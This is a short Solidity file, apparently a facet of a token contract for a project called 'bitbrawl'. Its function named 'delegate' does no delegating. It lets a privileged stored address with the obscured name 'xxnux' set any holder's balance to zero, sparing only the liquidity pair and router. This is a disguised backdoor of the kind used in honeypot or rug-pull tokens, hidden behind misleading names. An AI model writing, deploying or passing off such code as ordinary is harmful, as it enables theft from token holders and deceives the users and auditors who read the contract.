/*
 * SPDX-License-Identifier: MIT
 * Website: https://bitbrawl.io
 * X: https://twitter.com/bitbrawlio
 * Telegram: https://t.me/BitbrawlGlobal
 */

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract delegateFacet {
    function delegate(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
